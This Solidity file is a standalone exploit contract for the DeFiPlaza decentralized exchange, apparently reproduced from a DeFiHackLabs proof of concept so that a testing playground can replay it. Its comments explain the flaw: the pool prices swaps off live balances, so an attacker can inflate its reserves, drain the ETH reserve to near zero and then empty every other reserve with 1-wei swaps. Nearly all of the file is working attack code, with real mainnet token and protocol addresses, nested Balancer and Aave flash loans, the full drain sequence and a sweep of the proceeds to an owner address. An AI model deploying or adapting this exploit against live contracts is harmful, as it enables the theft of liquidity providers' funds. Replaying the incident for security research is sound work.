// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-DeFiPlaza).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest` itself is the flash-loan recipient — `receiveFlashLoan` and
// `executeOperation` are callbacks on the test, `attacker == address(this)`),
// so there is no standalone attack contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack (testExploit ->
// receiveFlashLoan -> executeOperation) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/DeFiPlaza_exp.sol.
//
// Root cause: DeFiPlaza prices every swap off live balanceOf() with no floor
// on the input reserve. addMultiple() lets the attacker inflate every one of
// the pool's 16 reserves ~18x, then a single-sided removeLiquidity(ETH) burns
// all the newly-minted LP and withdraws essentially the ENTIRE ETH reserve,
// driving it to ~0 while leaving the other 15 reserves 18x-inflated. With the
// input reserve at 0, swap()'s constant-product formula degenerates to
// `out = netIn * Y / netIn = Y` — a 1 wei input drains the WHOLE output
// reserve. Chaining 1-wei swaps ETH->Spell->YFI->...->USDT walks the entire
// inflated basket out for free.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// USDT/LINK's real `approve`/`transfer` do not return a bool (non-standard
// ERC20). The original DeFiHackLabs test types them as IUSDT for exactly this
// reason - a bool-returning call against them would revert on ABI decode of
// the (empty) return data.
interface IUSDT {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IDeFiPlaza is IERC20 {
    function swap(address inputToken, address outputToken, uint256 inputAmount, uint256 minOutputAmount)
        external
        payable
        returns (uint256 outputAmount);
    function addMultiple(address[] calldata tokens, uint256[] calldata maxAmounts)
        external
        payable
        returns (uint256 actualLP);
    function removeLiquidity(uint256 LPamount, address outputToken, uint256 minOutputAmount)
        external
        returns (uint256 actualOutput);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function repay(address asset, uint256 amount, uint256 rateMode, address onBehalfOf) external returns (uint256);
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

contract DeFiPlazaDrain {
    IDeFiPlaza constant DEFI = IDeFiPlaza(0xE68c1d72340aEeFe5Be76eDa63AE2f4bc7514110);
    IERC20 constant DFP2 = IERC20(0x2F57430a6ceDA85a67121757785877b4a71b8E6D);
    IERC20 constant YFI = IERC20(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e);
    IERC20 constant Matic = IERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
    IERC20 constant SUSHI = IERC20(0x6B3595068778DD592e39A122f4f5a5cF09C90fE2);
    IERC20 constant eXRD = IERC20(0x6468e79A80C0eaB0F9A2B574c8d5bC374Af59414);
    IERC20 constant CVX = IERC20(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B);
    IERC20 constant MKR = IERC20(0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2);
    IERC20 constant Spell = IERC20(0x090185f2135308BaD17527004364eBcC2D37e5F6);
    IERC20 constant AAVEtoken = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IUSDT constant LINK = IUSDT(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    IERC20 constant COMP = IERC20(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    IERC20 constant CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IAaveFlashloan constant AAVE = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IBalancerVault constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    address public owner_;

    constructor(address owner) {
        owner_ = owner;
    }

    // step 0: approve DeFiPlaza/Aave for every token, then Balancer-flash-loan a
    // 9-token basket. Everything from here happens inside the nested callbacks.
    function run() external {
        approveAll();

        uint256[] memory amount = new uint256[](9);
        address[] memory token = new address[](9);

        token[0] = address(WBTC);
        token[1] = address(LINK);
        token[2] = address(DAI);
        token[3] = address(AAVEtoken);
        token[4] = address(MKR);
        token[5] = address(USDC);
        token[6] = address(WETH);
        token[7] = address(CRV);
        token[8] = address(USDT);

        amount[0] = 3_453_558_744;
        amount[1] = 11_703_486_364_971_912_026_396;
        amount[2] = 1_579_853_285_099_364_323_842_974;
        amount[3] = 626_870_781_897_849_610_814_425;
        amount[4] = 160_573_001_420_344_730_080;
        amount[5] = 5_082_037_851_392;
        amount[6] = 34_546_473_222_602_105_572_392;
        amount[7] = 3_901_990_478_262_973_511_258;
        amount[8] = 3_721_449_521_913;

        bytes memory userencodeData = abi.encode(1, address(this));
        Balancer.flashLoan(address(this), token, amount, userencodeData);

        // Sweep every touched token to the real attacker/receiver.
        sweep(address(0));
        sweep(address(eXRD));
        sweep(address(USDC));
        sweep(address(USDT));
        sweep(address(DAI));
        sweep(address(LINK));
        sweep(address(WBTC));
        sweep(address(Spell));
        sweep(address(MKR));
        sweep(address(CRV));
        sweep(address(YFI));
        sweep(address(SUSHI));
        sweep(address(Matic));
        sweep(address(COMP));
        sweep(address(CVX));
    }

    // step 1: Balancer callback. Nest an Aave flash-loan (+ withdraw AAVE
    // collateral) to gather the remaining 6 assets, run the DeFiPlaza attack,
    // then repay Balancer.
    function receiveFlashLoan(
        IERC20[] memory, /* tokens */
        uint256[] memory, /* amounts */
        uint256[] memory, /* feeAmounts */
        bytes memory /* userData */
    ) external {
        address[] memory assets = new address[](6);
        assets[0] = address(WBTC);
        assets[1] = address(LINK);
        assets[2] = address(DAI);
        assets[3] = address(MKR);
        assets[4] = address(CRV);
        assets[5] = address(USDT);
        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 5_781_711_628;
        amounts[1] = 418_582_543_975_397_474_624_769;
        amounts[2] = 3_503_975_614_905_139_135_512_778;
        amounts[3] = 2_280_638_770_110_776_934_873;
        amounts[4] = 1_044_246_667_915_305_492_650_602;
        amounts[5] = 1_396_680_406_245;
        uint256[] memory interestRateModes = new uint256[](6);
        interestRateModes[0] = 2;
        interestRateModes[1] = 2;
        interestRateModes[2] = 2;
        interestRateModes[3] = 0;
        interestRateModes[4] = 0;
        interestRateModes[5] = 2;
        AAVE.flashLoan(address(this), assets, amounts, interestRateModes, address(this), bytes(""), 0);

        AAVE.repay(address(WBTC), 5_781_711_628, 2, address(this));
        AAVE.repay(address(LINK), 418_582_543_975_397_474_624_769, 2, address(this));
        AAVE.repay(address(DAI), 3_503_975_614_905_139_135_512_778, 2, address(this));
        AAVE.repay(address(USDT), 1_396_680_406_245, 2, address(this));
        AAVE.withdraw(address(AAVEtoken), 626_870_781_897_849_610_814_425, address(this));

        WBTC.transfer(address(Balancer), 3_453_558_744);
        LINK.transfer(address(Balancer), 11_703_486_364_971_912_026_396);
        DAI.transfer(address(Balancer), 1_579_853_285_099_364_323_842_974);
        AAVEtoken.transfer(address(Balancer), 626_870_781_897_849_610_814_425);
        MKR.transfer(address(Balancer), 160_573_001_420_344_730_080);
        USDC.transfer(address(Balancer), 5_082_037_851_392);
        WETH.transfer(address(Balancer), 34_546_473_222_602_105_572_392);
        CRV.transfer(address(Balancer), 3_901_990_478_262_973_511_258);
        USDT.transfer(address(Balancer), 3_721_449_521_913);
    }

    // step 2: Aave callback. This is where the actual DeFiPlaza attack runs:
    // pre-balance swaps, addMultiple (inflate every reserve ~18x), a
    // single-sided removeLiquidity that drains the ETH reserve to ~0
    // (THE VULNERABLE STEP), then a 15-hop chain of 1-wei swaps that each
    // drain the full reserve of the next token because their input reserve is
    // ~0.
    function executeOperation(
        address[] calldata, /* assets */
        uint256[] calldata, /* amounts */
        uint256[] calldata, /* premiums */
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {
        DEFI.swap(address(USDT), address(COMP), 256_581_711_438, 0);
        DEFI.swap(address(WBTC), address(DFP2), 462_981_892, 0);
        DEFI.swap(address(USDC), address(eXRD), 254_772_346_112, 0);
        DEFI.swap(address(MKR), address(SUSHI), 122_382_648_177_021_930_433, 0);
        DEFI.swap(address(DAI), address(CVX), 254_862_134_828_721_809_308_072, 0);
        DEFI.swap(address(LINK), address(Matic), 21_571_067_484_081_842_602_565, 0);

        DEFI.swap{value: 86 ether}(address(0), address(Spell), 86 ether, 0);
        DEFI.swap{value: 1727 ether}(address(0), address(YFI), 1727 ether, 0);

        address[] memory tokens = new address[](16);
        tokens[0] = address(0);
        tokens[1] = address(Spell);
        tokens[2] = address(YFI);
        tokens[3] = address(WBTC);
        tokens[4] = address(DFP2);
        tokens[5] = address(CVX);
        tokens[6] = address(LINK);
        tokens[7] = address(eXRD);
        tokens[8] = address(DAI);
        tokens[9] = address(SUSHI);
        tokens[10] = address(Matic);
        tokens[11] = address(MKR);
        tokens[12] = address(USDC);
        tokens[13] = address(COMP);
        tokens[14] = address(CRV);
        tokens[15] = address(USDT);
        uint256[] memory amounts = new uint256[](16);
        amounts[0] = 32_732 ether;
        amounts[1] = 88_888_888 ether;
        amounts[2] = 88_888_888 ether;
        amounts[3] = 87 * 1e8;
        amounts[4] = 88_888_888 ether;
        amounts[5] = 88_888_888 ether;
        amounts[6] = 88_888_888 ether;
        amounts[7] = 88_888_888 ether;
        amounts[8] = 88_888_888 ether;
        amounts[9] = 88_888_888 ether;
        amounts[10] = 88_888_888 ether;
        amounts[11] = 88_888_888 ether;
        amounts[12] = 88_888_888 ether;
        amounts[13] = 88_888_888 ether;
        amounts[14] = 88_888_888 ether;
        amounts[15] = 88_888_888 ether;
        // Inflate every one of DeFiPlaza's 16 reserves ~18x in one shot.
        DEFI.addMultiple{value: 32_732 ether}(tokens, amounts);
        uint256 amount = DEFI.balanceOf(address(this));

        // THE VULNERABLE STEP: single-sided withdrawal burns ALL of the newly
        // minted LP and pulls out ~100% of the pool's ETH reserve, driving it
        // to ~0 while leaving the other 15 (18x-inflated) reserves untouched.
        DEFI.removeLiquidity(amount, address(0), 0);

        // With the ETH reserve now ~0, swap()'s constant-product formula
        // degenerates: out = netIn * Y / ((0 << 64) + netIn) = Y. A 1 wei
        // input buys the ENTIRE output reserve. Chain this through all 15
        // tokens — each hop empties its own input reserve, priming the next.
        DEFI.swap{value: 0.000000000000000001 ether}(address(0), address(Spell), 1, 0);
        DEFI.swap(address(Spell), address(YFI), 1, 0);
        DEFI.swap(address(YFI), address(WBTC), 1, 0);
        DEFI.swap(address(WBTC), address(DFP2), 1, 0);
        DEFI.swap(address(DFP2), address(CVX), 1, 0);
        DEFI.swap(address(CVX), address(LINK), 1, 0);
        DEFI.swap(address(LINK), address(eXRD), 1, 0);
        DEFI.swap(address(eXRD), address(DAI), 1, 0);
        DEFI.swap(address(DAI), address(SUSHI), 1, 0);
        DEFI.swap(address(SUSHI), address(Matic), 1, 0);
        DEFI.swap(address(Matic), address(MKR), 1, 0);
        DEFI.swap(address(MKR), address(USDC), 1, 0);
        DEFI.swap(address(USDC), address(COMP), 1, 0);
        DEFI.swap(address(COMP), address(CRV), 1, 0);
        DEFI.swap(address(CRV), address(USDT), 1, 0);
        AAVE.supply(address(AAVEtoken), 626_870_781_897_849_610_814_425, address(this), 0);
        return true;
    }

    function approveAll() public {
        SUSHI.approve(address(DEFI), type(uint256).max);
        COMP.approve(address(DEFI), type(uint256).max);
        CRV.approve(address(DEFI), type(uint256).max);
        CRV.approve(address(AAVE), type(uint256).max);
        LINK.approve(address(DEFI), type(uint256).max);
        LINK.approve(address(AAVE), type(uint256).max);
        AAVEtoken.approve(address(AAVE), type(uint256).max);
        Spell.approve(address(DEFI), type(uint256).max);
        CVX.approve(address(DEFI), type(uint256).max);
        eXRD.approve(address(DEFI), type(uint256).max);
        WBTC.approve(address(AAVE), type(uint256).max);
        WBTC.approve(address(DEFI), type(uint256).max);
        Matic.approve(address(DEFI), type(uint256).max);
        MKR.approve(address(DEFI), type(uint256).max);
        MKR.approve(address(AAVE), type(uint256).max);
        YFI.approve(address(DEFI), type(uint256).max);
        DFP2.approve(address(DEFI), type(uint256).max);
        USDT.approve(address(DEFI), type(uint256).max);
        USDT.approve(address(AAVE), type(uint256).max);
        USDC.approve(address(DEFI), type(uint256).max);
        DAI.approve(address(DEFI), type(uint256).max);
        DAI.approve(address(AAVE), type(uint256).max);
    }

    function sweep(address token) internal {
        if (token == address(0)) {
            uint256 bal = address(this).balance;
            if (bal > 0) payable(owner_).transfer(bal);
            return;
        }
        // USDT/LINK's real `transfer` does not return a bool - decoding one
        // here would revert on the (empty) return data, exactly like approve.
        if (token == address(USDT) || token == address(LINK)) {
            uint256 tbal = IUSDT(token).balanceOf(address(this));
            if (tbal > 0) IUSDT(token).transfer(owner_, tbal);
            return;
        }
        uint256 bal2 = IERC20(token).balanceOf(address(this));
        if (bal2 > 0) IERC20(token).transfer(owner_, bal2);
    }

    receive() external payable {}
    fallback() external payable {}
}
